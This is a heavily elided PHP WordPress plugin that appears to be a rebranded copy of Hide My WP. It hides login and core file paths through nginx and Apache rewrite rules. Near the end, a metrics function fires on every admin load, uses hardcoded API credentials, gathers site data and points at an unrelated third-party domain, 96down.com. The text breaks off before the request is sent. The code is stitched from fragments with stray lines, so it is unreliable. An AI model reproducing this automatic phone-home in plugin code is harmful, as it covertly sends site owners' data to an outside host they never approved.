<?php
/*
Plugin Name: Seguridad m2i
Plugin URI: http://metrics2index.com
Description: -proteger de manera sencilla wordpress
Author: ivan rios
Version: 1                                     
Text Domain: hide_everything
Domain Path: /lang
Network: True
*/

define( 'HMW_TITLE', 'M2I Security'); 
define( 'HMW_VERSION', '1' );                   
define( 'HMW_SLUG', 'M2I_Security'); //use _
   ...
   */
   function __construct() {
	...
	if (is_multisite() && !$this->blog_path && $this->is_subdir_mu) {
        ...
        add_action( 'admin_init', array(&$this,'add_presstrends'));
        ...
        if ($this->opt('replace_wpnonce')) {
            ...
            $this->replace_old[]= '_wpnonce';
            $this->replace_new[]= '_nonce';  
        }
...
$this->h->update_pp_important_messages();
        ...
        if (isset($_GET['page']) && $_GET['page']=="w3tc_minify")
            echo '<div class="error"><p>' . __('In order to enable minify beside Hide My WP you need a small change in W3 Total Cache. If you already did it ignore this message. <a target="_blank" href="http://www.96down.com/">Read more</a>', self::slug ) . '</p></div>'; 
   ...
   /**
    ...
    /**
     *Necesario para ejecutar el error 404 al bloquear una página
      ...
      if (basename($_SERVER['PHP_SELF']) == 'options-permalink.php' && isset($_POST['permalink_structure']) ){
       ...
       $category_enable=$this->opt('category_enable');
        ...
        if ($this->opt('hide_wp_login') && !$is_trusted)  {
            ...
            if ($this->h->ends_with($_SERVER['PHP_SELF'], '/wp-login.php') || $this->h->ends_with($_SERVER['PHP_SELF'], '/wp-login.php/')) { 
                $this->block_access();
            }                
        }
...
;
        ...
        if ($this->opt('replace_comments_post') && trim($this->opt('replace_comments_post'), '/ ')!='wp-comments-post.php' && $this->is_permalink())        {
            ...
            $new_non_wp_rules[$comments_post] = $rel_comments_post;
	...
	$hide_other_file_rule = $rel_theme_path.'/screenshot\.png|'.$this->sub_folder .'readme\.html|'.$this->sub_folder .'license\.txt|'.$rel_content_path.'/debug\.log'.$style_path_reg.'|'.$rel_include_path.'/$'; 
...
;
        ...
        if ($new_style_name)
            $output.='rewrite ^/'.$new_theme_path. '/'.str_replace('.','\.', $new_style_name).' /'.$rel_theme_path.'/style.css last;'."\n";
    
        if ($new_theme_path)
            $output.='rewrite ^/'.$new_theme_path. '/(.*) /'. $rel_theme_path. '/$1 last;'."\n";
        
        if ($replace_comments_post && $replace_comments_post != 'wp-comments-post.php')
            $output.='rewrite ^/'.$replace_comments_post_rule. ' /'. $rel_comments_post. ' last;'."\n";
    ...
    function single_config(){
        ...
        $rel_include_path = $sub_install . trim(WPINC); 
        ...
        $rel_content_path = $sub_install . trim(str_replace(site_url(),'', HMW_WP_CONTENT_URL), '/');
        $rel_theme_path_no_template = str_replace('/'.get_stylesheet(), '', $rel_theme_path);
        ...
        //|'.$rel_plugin_path.'/index\.php|'.$rel_theme_path_no_template.'/index\.php'    
        $hide_other_file_rule = $rel_theme_path.'/screenshot\.png|'.$sub_install .'readme\.html|'.$sub_install .'license\.txt|'.$rel_content_path.'/debug\.log'.$style_path_reg.'|'.$rel_include_path.'/$'; 
...
;
        ...
        if ($replace_comments_post && $replace_comments_post != 'wp-comments-post.php')
            $output.='RewriteRule ^'.$replace_comments_post_rule. ' /'. $rel_comments_post. ' [QSA,L]'."\n";
	...
	if ($this->is_subdir_mu)   
             $hide_other_file_rule = str_replace($this->sub_folder,'', $rel_theme_path) .'/screenshot\.png|' .'readme\.html|'.'license\.txt|'.str_replace($this->sub_folder,'',$rel_content_path).'/debug\.log'. str_replace($this->sub_folder,'',$style_path_reg) .'|'.str_replace($this->sub_folder,'', $rel_include_path).'/$'; 
	else
	     $hide_other_file_rule = $rel_theme_path.'/screenshot\.png|'.$this->sub_folder .'readme\.html|'.$this->sub_folder .'license\.txt|'.$rel_content_path.'/debug\.log'.$style_path_reg.'|'.$rel_include_path.'/$'; 
...
;
        ...
        if ($replace_comments_post && $replace_comments_post != 'wp-comments-post.php')
	    if ($this->is_subdir_mu)            
		$output.='RewriteRule ^([_0-9a-zA-Z-]+/)?'.$replace_comments_post_rule. ' /'. $rel_comments_post. ' [QSA,L]'."\n";
	    else
		$output.='RewriteRule ^'.$replace_comments_post_rule. ' /'. $rel_comments_post. ' [QSA,L]'."\n";
    ...
    function add_presstrends() {
        $api_key = 'nql1xzu9cuqz2kp2qsvoazi97nyq5ukb62fv';
        $auth    = 'suqvu10uwfwfhdlypqenwtitip0nq1djl';
        // Start of Metrics
        global $wpdb;
        $data = get_transient( 'presstrends_cache_data' );
        if ( !$data || $data == '' ) {
            $api_base = 'http://www.96down.com/api/hide-my-wp/';
